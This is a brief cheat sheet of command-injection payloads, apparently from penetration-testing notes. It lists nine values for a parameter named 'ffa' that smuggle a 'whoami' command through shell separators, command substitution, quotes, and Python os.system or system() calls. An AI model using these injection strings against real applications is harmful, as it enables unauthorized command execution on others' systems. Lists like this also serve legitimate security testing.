
## Command Injection

```
ffa=test; whoami
```

```
ffa=test| whoami
```

```
ffa=test&& whoami
```

```
ffa=test$(whoami)
```

```
ffa=test'whoami'
```

```
ffa=test1+1'whoami'
```

```
ffa=test1+1$(whoami)
```

```
ffa=test; import os; os.system('whoami') #
```

```
ffa=test; system('whoami'); #
```
